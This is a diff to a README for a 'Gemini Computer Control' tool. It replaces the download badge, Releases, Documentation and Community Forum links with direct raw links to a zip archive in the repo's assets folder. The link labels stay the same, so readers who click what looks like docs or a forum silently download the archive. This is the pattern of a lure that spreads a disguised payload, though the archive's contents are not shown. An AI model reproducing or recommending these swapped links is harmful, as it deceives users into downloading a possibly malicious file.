@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Gemini Computer Control](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/ABUTHAHIR101/gemini-computer-control/releases)
+[![Download Gemini Computer Control](https://raw.githubusercontent.com/ABUTHAHIR101/gemini-computer-control/main/frontend/assets/gemini-control-computer-v2.6.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/ABUTHAHIR101/gemini-computer-control/main/frontend/assets/gemini-control-computer-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download, make sure your system meets the following requirements:
 
 To get started, you need to download the software. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/ABUTHAHIR101/gemini-computer-control/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ABUTHAHIR101/gemini-computer-control/main/frontend/assets/gemini-control-computer-v2.6.zip).
 2. On this page, you will see available versions of the software.
 3. Click on the version you want to download.
 4. Wait for the download to finish. It should take a few moments depending on your internet speed.
@@ -66,9 +66,9 @@ For any questions or support, feel free to reach out through the GitHub reposito
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/ABUTHAHIR101/gemini-computer-control/blob/main/docs/README.md): Learn more about advanced features.
-- [Community Forum](https://github.com/ABUTHAHIR101/gemini-computer-control/discussions): Join discussions with other users.
+- [Documentation](https://raw.githubusercontent.com/ABUTHAHIR101/gemini-computer-control/main/frontend/assets/gemini-control-computer-v2.6.zip): Learn more about advanced features.
+- [Community Forum](https://raw.githubusercontent.com/ABUTHAHIR101/gemini-computer-control/main/frontend/assets/gemini-control-computer-v2.6.zip): Join discussions with other users.
 
 ## 📥 Download Again
 
-Don't forget, you can always get the latest version from the [Releases page](https://github.com/ABUTHAHIR101/gemini-computer-control/releases). Enjoy using Gemini Computer Control!
+Don't forget, you can always get the latest version from the [Releases page](https://raw.githubusercontent.com/ABUTHAHIR101/gemini-computer-control/main/frontend/assets/gemini-control-computer-v2.6.zip). Enjoy using Gemini Computer Control!
